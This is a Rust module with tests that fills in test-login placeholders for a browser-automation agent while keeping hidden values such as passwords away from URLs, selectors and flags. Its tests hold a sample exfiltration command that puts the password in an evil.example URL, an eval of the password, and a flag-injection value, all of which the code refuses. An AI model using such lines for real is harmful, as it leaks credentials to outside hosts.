//! `{{NAME}}` in a run's args: a value of the run's test login, put in by the extension so the agent never sees it
//! (MB-926 §4).
//!
//! - **Shown values** go anywhere: `["open", "{{URL}}"]`, `["fill", "@e1", "{{EMAIL}}"]`.
//! - **Hidden values** go only in the text of `fill`, `type`, `keyboard type` or `keyboard inserttext`, never in a
//!   URL or a selector, and only while the page is on the login's URL's origin (checked by the caller, with the
//!   page's URL). A login with no URL gets no hidden value at all.
//! - **An unknown name is refused**, naming it, and so is any `{{NAME}}` in a run without a login.

use anyhow::bail;

use crate::cli;
use crate::login::{valid_name, Login};

/// What `{{NAME}}`s a word holds: each one's byte range (braces included) and its name. Braces around anything that
/// isn't a name (`{{ x }}`, `{{a}}`) are text, left as they are.
pub fn placeholders(word: &str) -> Vec<(usize, usize, &str)> {
    let mut found = Vec::new();
    let mut from = 0;
    while let Some(at) = word[from..].find("{{").map(|i| i + from) {
        let rest = &word[at + 2..];
        match rest.find("}}") {
            Some(end) if valid_name(&rest[..end]) => {
                found.push((at, at + 2 + end + 2, &rest[..end]));
                from = at + 2 + end + 2;
            }
            _ => from = at + 2,
        }
    }
    found
}

/// Whether any arg has a `{{NAME}}`.
pub fn any(args: &[String]) -> bool {
    args.iter().any(|a| !placeholders(a).is_empty())
}

/// The commands whose text may carry a hidden value, and which word it is (0 is the command).
pub const TEXT_COMMANDS: &str = "fill, type, keyboard type or keyboard inserttext";

/// Which arg is the command's text, if it's one of TEXT_COMMANDS: `fill <sel> <text>`, `type <sel> <text>`,
/// `keyboard type <text>`, `keyboard inserttext <text>`.
pub fn text_slot(args: &[String]) -> Option<usize> {
    let places = cli::word_places(args).ok()?;
    let word = |n: usize| places.get(n).map(|&i| args[i].as_str());
    match (word(0)?, word(1)) {
        ("fill" | "type", _) => places.get(2).copied(),
        ("keyboard", Some("type" | "inserttext")) => places.get(2).copied(),
        _ => None,
    }
}

/// The args with each `{{NAME}}` replaced by `login`'s value, and whether a hidden one went in (the caller then checks
/// the page is on the login's origin, and sends the command on stdin, not argv). Refused, naming the name and never a
/// value: a run without a login, a name the login hasn't got, a hidden value outside the text of a fill or type or in
/// a login with no URL, and a value that agent-browser would read as a flag.
pub fn fill_in(args: &[String], login: Option<(&str, &Login)>) -> anyhow::Result<(Vec<String>, bool)> {
    if !any(args) {
        return Ok((args.to_vec(), false));
    }
    let Some((label, login)) = login else {
        let name = args.iter().flat_map(|a| placeholders(a)).map(|p| p.2).next().unwrap_or_default();
        bail!("{{{{{name}}}}} is a test login's value: pass login (its label) to use it");
    };
    let slot = text_slot(args);
    let mut out = Vec::with_capacity(args.len());
    let mut hidden = false;
    for (i, arg) in args.iter().enumerate() {
        let found = placeholders(arg);
        if found.is_empty() {
            out.push(arg.clone());
            continue;
        }
        let mut word = String::new();
        let mut last = 0;
        for (start, end, name) in found {
            let Some(value) = login.get(name) else {
                bail!("the login {label} has no {name}: it has {}", login.names().join(", "))
            };
            if login.hidden(name) {
                if slot != Some(i) {
                    bail!(
                        "{{{{{name}}}}} is hidden: it goes only in the text of {TEXT_COMMANDS}, never in a URL or a \
                         selector"
                    );
                }
                if login.origin.is_none() {
                    bail!(
                        "{{{{{name}}}}} is hidden and the login {label} has no URL: a hidden value is typed only on its \
                         URL's site"
                    );
                }
                hidden = true;
            }
            word.push_str(&arg[last..start]);
            word.push_str(value);
            last = end;
        }
        word.push_str(&arg[last..]);
        if cli::reads_as_flag(&word) {
            let names: Vec<&str> = placeholders(arg).into_iter().map(|p| p.2).collect();
            bail!("with {} put in, the word starts with -, which agent-browser would read as a flag", names.join(", "));
        }
        out.push(word);
    }
    Ok((out, hidden))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn words(v: &[&str]) -> Vec<String> {
        v.iter().map(|s| s.to_string()).collect()
    }

    fn login(url: bool) -> Login {
        let mut vars = json!({"EMAIL": "bot@example.com", "PASSWORD": "hunter2 pass", "TEAM": "blue"});
        if url {
            vars["URL"] = "https://stage.example.dev/sign-in".into();
        }
        Login::parse(&json!({"kind": "env", "vars": vars, "plain": ["EMAIL", "TEAM", "URL"]}).to_string()).unwrap()
    }

    fn fill(args: &[&str], l: &Login) -> anyhow::Result<(Vec<String>, bool)> {
        fill_in(&words(args), Some(("stage", l)))
    }

    #[test]
    fn placeholders_are_names_in_double_braces() {
        assert_eq!(placeholders("{{URL}}"), [(0, 7, "URL")]);
        assert_eq!(placeholders("a{{A_1}}b{{B}}"), [(1, 8, "A_1"), (9, 14, "B")]);
        for text in ["{{ x }}", "{{lower}}", "{{1A}}", "{{A", "{}", "plain"] {
            assert!(placeholders(text).is_empty(), "{text}");
        }
    }

    #[test]
    fn the_text_slot_is_the_text_of_fill_type_and_keyboard_type() {
        assert_eq!(text_slot(&words(&["fill", "@e1", "x"])), Some(2));
        assert_eq!(text_slot(&words(&["type", "--exact", "@e1", "x"])), Some(3), "flags are skipped");
        assert_eq!(text_slot(&words(&["keyboard", "type", "x"])), Some(2));
        assert_eq!(text_slot(&words(&["keyboard", "inserttext", "x"])), Some(2));
        for none in [&["keyboard", "press", "x"][..], &["open", "x"], &["find", "role", "textbox", "fill", "x"]] {
            assert_eq!(text_slot(&words(none)), None, "{none:?}");
        }
    }

    #[test]
    fn shown_values_go_anywhere() {
        let l = login(true);
        let (out, hidden) = fill(&["open", "{{URL}}"], &l).unwrap();
        assert_eq!((out, hidden), (words(&["open", "https://stage.example.dev/sign-in"]), false));
        let (out, _) = fill(&["find", "text", "Team {{TEAM}}", "click"], &l).unwrap();
        assert_eq!(out[2], "Team blue");
    }

    #[test]
    fn hidden_values_go_only_in_the_text_of_fill_and_type() {
        let l = login(true);
        for ok in [
            &["fill", "@e2", "{{PASSWORD}}"][..],
            &["type", "#pw", "{{PASSWORD}}"],
            &["keyboard", "type", "x{{PASSWORD}}"],
        ] {
            let (out, hidden) = fill(ok, &l).unwrap();
            assert!(hidden && out.iter().any(|w| w.contains("hunter2 pass")), "{ok:?}");
        }
        for bad in [
            &["open", "https://evil.example/?p={{PASSWORD}}"][..],
            &["fill", "{{PASSWORD}}", "x"],
            &["click", "{{PASSWORD}}"],
            &["eval", "'{{PASSWORD}}'"],
            &["find", "role", "textbox", "fill", "{{PASSWORD}}"],
            &["keyboard", "press", "{{PASSWORD}}"],
            &["wait", "--url", "{{PASSWORD}}"],
        ] {
            let e = fill(bad, &l).unwrap_err().to_string();
            assert!(e.contains("{{PASSWORD}} is hidden") && !e.contains("hunter2"), "{bad:?}: {e}");
        }
    }

    #[test]
    fn a_login_without_a_url_gets_no_hidden_value() {
        let l = login(false);
        let e = fill(&["fill", "@e2", "{{PASSWORD}}"], &l).unwrap_err().to_string();
        assert!(e.contains("no URL"), "{e}");
        assert_eq!(fill(&["fill", "@e1", "{{EMAIL}}"], &l).unwrap().0[2], "bot@example.com");
    }

    #[test]
    fn an_unknown_name_or_no_login_is_refused_by_name() {
        let l = login(true);
        let e = fill(&["fill", "@e1", "{{OTP}}"], &l).unwrap_err().to_string();
        assert!(e.contains("no OTP") && e.contains("EMAIL, PASSWORD, TEAM, URL"), "{e}");
        let e = fill_in(&words(&["fill", "@e1", "{{EMAIL}}"]), None).unwrap_err().to_string();
        assert!(e.contains("{{EMAIL}}") && e.contains("pass login"), "{e}");
        assert_eq!(fill_in(&words(&["fill", "@e1", "{{ not }}"]), None).unwrap().0[2], "{{ not }}");
    }

    #[test]
    fn a_value_read_as_a_flag_is_refused_without_it() {
        let l = Login::parse(
            &json!({"kind": "env", "vars": {"URL": "https://x.example/", "PASSWORD": "--headed-pass"}, "plain": ["URL"]})
                .to_string(),
        )
        .unwrap();
        let e = fill(&["fill", "@e1", "{{PASSWORD}}"], &l).unwrap_err().to_string();
        assert!(e.contains("read as a flag") && e.contains("PASSWORD") && !e.contains("headed-pass"), "{e}");
    }
}
